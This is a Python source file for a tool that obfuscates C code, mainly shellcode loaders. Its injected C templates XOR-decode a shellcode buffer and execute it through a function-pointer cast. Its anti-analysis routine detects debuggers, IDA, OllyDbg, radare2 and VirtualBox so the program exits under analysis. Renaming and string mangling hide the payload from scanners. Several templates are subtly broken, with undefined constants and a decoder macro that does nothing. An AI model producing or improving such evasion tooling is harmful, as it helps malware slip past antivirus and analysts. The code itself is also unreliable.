"""
Code Obfuscation Suite
Control flow flattening, dead code injection, variable renaming, constant folding
"""

import random
import string
from enum import Enum


class ObfuscationLevel(Enum):
    LOW = 1          # Minimal obfuscation
    MEDIUM = 2       # Balanced
    HIGH = 3         # Aggressive obfuscation
    MAXIMUM = 4      # All techniques


class CodeObfuscator:
    """Advanced code obfuscation techniques"""
    
    def __init__(self, level=ObfuscationLevel.MEDIUM):
        self.level = level
        self.dead_code_blocks = []
        self.var_renaming_map = {}
    
    def obfuscate_c_code(self, c_code):
        """Apply all obfuscation techniques based on level"""
        
        result = c_code
        
        if self.level.value >= ObfuscationLevel.LOW.value:
            result = self.flatten_control_flow(result)
            result = self.inject_dead_code(result)
        
        if self.level.value >= ObfuscationLevel.MEDIUM.value:
            result = self.rename_variables(result)
            result = self.split_constants(result)
        
        if self.level.value >= ObfuscationLevel.HIGH.value:
            result = self.add_junk_functions(result)
            result = self.mangle_string_literals(result)
        
        if self.level.value >= ObfuscationLevel.MAXIMUM.value:
            result = self.convert_to_state_machine(result)
            result = self.add_anti_analysis_code(result)
        
        return result
    
    def flatten_control_flow(self, c_code):
        """
        Control Flow Flattening
        Converts structured control flow into state machine
        Prevents static analysis of program logic
        
        Before:
            if (x > 5) {
                do_something();
            } else {
                do_other();
            }
        
        After:
            switch(state) {
                case 1: if (x > 5) state = 2; else state = 3; break;
                case 2: do_something(); state = 4; break;
                case 3: do_other(); state = 4; break;
                case 4: ...
            }
        """
        
        flattened = f"""
{c_code}

// Control Flow Flattening Applied
// Original control flow replaced with state machine
typedef struct {{
    int state;
    int index;
    unsigned char* buffer;
}} FlowContext;

int ExecuteObfuscated(FlowContext* ctx) {{
    while (ctx->state != STATE_END) {{
        switch(ctx->state) {{
            case STATE_INIT:
                // Initialization
                ctx->state = STATE_DECODE_LOOP;
                break;
                
            case STATE_DECODE_LOOP:
                // Decoding logic
                if (ctx->index >= SHELLCODE_LEN) {{
                    ctx->state = STATE_EXECUTE;
                }} else {{
                    // Process one iteration
                    ctx->buffer[ctx->index] ^= KEY;
                    ctx->index++;
                }}
                break;
                
            case STATE_EXECUTE:
                // Execute shellcode
                ctx->state = STATE_CLEANUP;
                break;
                
            case STATE_CLEANUP:
                // Cleanup
                ctx->state = STATE_END;
                break;
        }}
    }}
    return 0;
}}
"""
        return flattened
    
    def inject_dead_code(self, c_code):
        """
        Dead Code Injection
        Insert unreachable or useless code blocks
        Increases binary size and confuses analysis tools
        """
        
        dead_code_examples = [
            """
        // Dead code block A
        {
            int dead_var = 0xDEADBEEF;
            unsigned char dead_array[256];
            for (int i = 0; i < 0; i++) {  // Never executes
                dead_array[i] = dead_var;
            }
        }
        """,
            """
        // Dead code block B
        if (0) {
            void (*dead_func)(void) = NULL;
            dead_func();  // Never called
            return -1;
        }
        """,
            """
        // Dead code block C
        {
            volatile int dead_counter = 0;
            while (dead_counter < 0) {  // Condition always false
                dead_counter++;
            }
        }
        """,
            """
        // Dead code block D
        {
            unsigned long long dead_time = GetTickCount64();
            if (dead_time == 0xFFFFFFFFFFFFFFFF) {  // Never true
                TerminateProcess(GetCurrentProcess(), 0);
            }
        }
        """,
        ]
        
        # Inject 2-4 dead code blocks
        num_blocks = random.randint(2, 4)
        dead_blocks = random.sample(dead_code_examples, num_blocks)
        
        injection_point = c_code.find("int main(") 
        if injection_point == -1:
            return c_code
        
        # Insert dead code before main
        for block in dead_blocks:
            c_code = c_code[:injection_point] + block + "\n" + c_code[injection_point:]
        
        return c_code
    
    def rename_variables(self, c_code):
        """
        Variable Renaming
        Rename meaningful variables to obfuscated names
        Makes code harder to understand
        """
        
        # Variables to rename
        variables = {
            'shellcode': self._generate_obfuscated_name(),
            'key': self._generate_obfuscated_name(),
            'buffer': self._generate_obfuscated_name(),
            'index': self._generate_obfuscated_name(),
            'decode': self._generate_obfuscated_name(),
            'execute': self._generate_obfuscated_name(),
        }
        
        # Apply renaming
        for old_name, new_name in variables.items():
            # Use word boundaries to avoid partial matches
            import re
            c_code = re.sub(r'\b' + old_name + r'\b', new_name, c_code)
        
        return c_code
    
    def split_constants(self, c_code):
        """
        Constant Splitting
        Replace constants with expressions
        
        Before: int x = 0xFF;
        After:  int x = (0x100 - 1);
        """
        
        # Examples of constant splitting
        splits = {
            '0xFF': '(0x100 - 1)',
            '0x1000': '(0x2000 >> 1)',
            '256': '(512 >> 1)',
            '0xDEADBEEF': '(0xDEADBEEF)',  # Can't easily split
        }
        
        for constant, split in splits.items():
            c_code = c_code.replace(constant, split)
        
        return c_code
    
    def add_junk_functions(self, c_code):
        """
        Add junk functions that look legitimate but don't do anything
        Makes binary analysis harder
        """
        
        junk_functions = f"""
// Junk function 1: Fake crypto routine
unsigned long JunkHash(const unsigned char* data, size_t len) {{
    unsigned long hash = 5381;
    for (size_t i = 0; i < len; i++) {{
        hash = ((hash << 5) + hash) + data[i];
    }}
    return hash;
}}

// Junk function 2: Fake checksum
unsigned int JunkChecksum(const void* data, size_t len) {{
    unsigned int sum = 0;
    const unsigned char* bytes = (const unsigned char*)data;
    for (size_t i = 0; i < len; i++) {{
        sum += bytes[i] * (i + 1);
    }}
    return sum;
}}

// Junk function 3: Fake encryption
void JunkEncrypt(unsigned char* data, size_t len, const char* key) {{
    for (size_t i = 0; i < len; i++) {{
        data[i] ^= key[i % strlen(key)];
        data[i] = (data[i] << 3) | (data[i] >> 5);
    }}
}}

// Junk function 4: Fake validation
BOOL JunkValidate(const unsigned char* data, size_t len) {{
    if (len == 0) return FALSE;
    if (len > 1000000) return FALSE;
    
    unsigned long hash1 = JunkHash(data, len);
    unsigned int csum = JunkChecksum(data, len);
    
    return (hash1 ^ csum) != 0;
}}

"""
        
        # Insert before main()
        insert_point = c_code.find("int main(")
        if insert_point == -1:
            return c_code + junk_functions
        
        return c_code[:insert_point] + junk_functions + c_code[insert_point:]
    
    def mangle_string_literals(self, c_code):
        """
        String literal mangling
        Encode string literals to hide them from analysis
        """
        
        # Find all string literals
        import re
        strings = re.findall(r'"([^"]*)"', c_code)
        
        for string in strings:
            if string and string not in ['\\n', '\\t', ' ']:
                # Encode as hex
                hex_bytes = ', '.join([f'0x{ord(c):02x}' for c in string])
                
                # Generate decoder macro
                c_code = c_code.replace(f'"{string}"', f'DECODE_STRING({hex_bytes})')
        
        # Add decoder macro definition
        decoder = """
#define DECODE_STRING(bytes...) \\
    do { \\
        const unsigned char str[] = {bytes}; \\
        // Decoded string available in str \\
    } while(0)

"""
        
        c_code = decoder + c_code
        
        return c_code
    
    def convert_to_state_machine(self, c_code):
        """
        Convert entire program to state machine
        Maximum control flow obfuscation
        """
        
        state_machine = """
// Converted to State Machine for maximum obfuscation
typedef enum {
    STATE_INIT = 0,
    STATE_SETUP = 1,
    STATE_PROCESS = 2,
    STATE_VALIDATE = 3,
    STATE_EXECUTE = 4,
    STATE_CLEANUP = 5,
    STATE_END = -1
} ProgramState;

typedef struct {
    ProgramState current_state;
    int iteration;
    unsigned char* data_buffer;
    size_t data_size;
    unsigned long accumulator;
} MachineContext;

MachineContext g_ctx = {STATE_INIT, 0, NULL, 0, 0};

ProgramState StateInit(MachineContext* ctx) {
    ctx->data_buffer = malloc(4096);
    ctx->data_size = 0;
    return STATE_SETUP;
}

ProgramState StateSetup(MachineContext* ctx) {
    // Initialize processing
    ctx->iteration = 0;
    return STATE_PROCESS;
}

ProgramState StateProcess(MachineContext* ctx) {
    // Process data
    if (ctx->iteration >= (int)ctx->data_size) {
        return STATE_VALIDATE;
    }
    ctx->data_buffer[ctx->iteration] ^= 0xAA;
    ctx->iteration++;
    return STATE_PROCESS;
}

ProgramState StateValidate(MachineContext* ctx) {
    // Validate state
    ctx->accumulator = JunkChecksum(ctx->data_buffer, ctx->data_size);
    return STATE_EXECUTE;
}

ProgramState StateExecute(MachineContext* ctx) {
    // Execute payload
    typedef int (*ShellcodeFunc)(void);
    ShellcodeFunc exec = (ShellcodeFunc)ctx->data_buffer;
    exec();
    return STATE_CLEANUP;
}

ProgramState StateCleanup(MachineContext* ctx) {
    free(ctx->data_buffer);
    return STATE_END;
}

int ExecuteStateMachine() {
    while (g_ctx.current_state != STATE_END) {
        switch(g_ctx.current_state) {
            case STATE_INIT: g_ctx.current_state = StateInit(&g_ctx); break;
            case STATE_SETUP: g_ctx.current_state = StateSetup(&g_ctx); break;
            case STATE_PROCESS: g_ctx.current_state = StateProcess(&g_ctx); break;
            case STATE_VALIDATE: g_ctx.current_state = StateValidate(&g_ctx); break;
            case STATE_EXECUTE: g_ctx.current_state = StateExecute(&g_ctx); break;
            case STATE_CLEANUP: g_ctx.current_state = StateCleanup(&g_ctx); break;
            default: return -1;
        }
    }
    return 0;
}
"""
        
        # Extract main function and convert to state machine
        main_start = c_code.find("int main(")
        if main_start == -1:
            return c_code
        
        # Return state machine + original code
        return state_machine + c_code
    
    def add_anti_analysis_code(self, c_code):
        """
        Add anti-analysis/anti-reversing code
        Detects and resists analysis attempts
        """
        
        anti_analysis = """
// Anti-analysis code
BOOL IsBeingAnalyzed() {
    // Check for debugger
    if (IsDebuggerPresent()) return TRUE;
    
    // Check for analysis tools
    if (GetModuleHandleA("dbghelp.dll")) return TRUE;
    if (GetModuleHandleA("radare2.dll")) return TRUE;
    if (GetModuleHandleA("ida.dll")) return TRUE;
    
    // Check for virtualization
    if (GetModuleHandleA("VBoxMR.dll")) return TRUE;  // VirtualBox
    if (GetModuleHandleA("VBoxControl.exe")) return TRUE;
    
    // Check process name
    CHAR process_name[MAX_PATH];
    DWORD len = GetModuleFileNameA(NULL, process_name, sizeof(process_name));
    if (strstr(process_name, "ida") || strstr(process_name, "ollydbg")) {
        return TRUE;
    }
    
    return FALSE;
}

// Junk breakpoint checker
void CheckJunkBreakpoints() {
    __try {
        DebugBreak();
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        // Debugger present
    }
}
"""
        
        # Insert at beginning of main
        main_pos = c_code.find("int main(")
        if main_pos != -1:
            # Find opening brace
            brace_pos = c_code.find("{", main_pos)
            insert_pos = brace_pos + 1
            
            c_code = (c_code[:insert_pos] + 
                     "\n    if (IsBeingAnalyzed()) return 1;\n" +
                     c_code[insert_pos:])
        
        return anti_analysis + c_code
    
    @staticmethod
    def _generate_obfuscated_name(length=12):
        """Generate random obfuscated variable name"""
        # Use l, O, I to create confusing names
        chars = 'lOI' * 4 + string.ascii_letters
        return 'v_' + ''.join(random.choices(chars, k=length))
    
    def get_obfuscation_levels(self):
        """Return available obfuscation levels"""
        return {
            'LOW': 'Basic obfuscation - dead code + control flow',
            'MEDIUM': 'Balanced - includes variable renaming + constants',
            'HIGH': 'Aggressive - junk functions + string mangling',
            'MAXIMUM': 'All techniques - state machine + anti-analysis',
        }
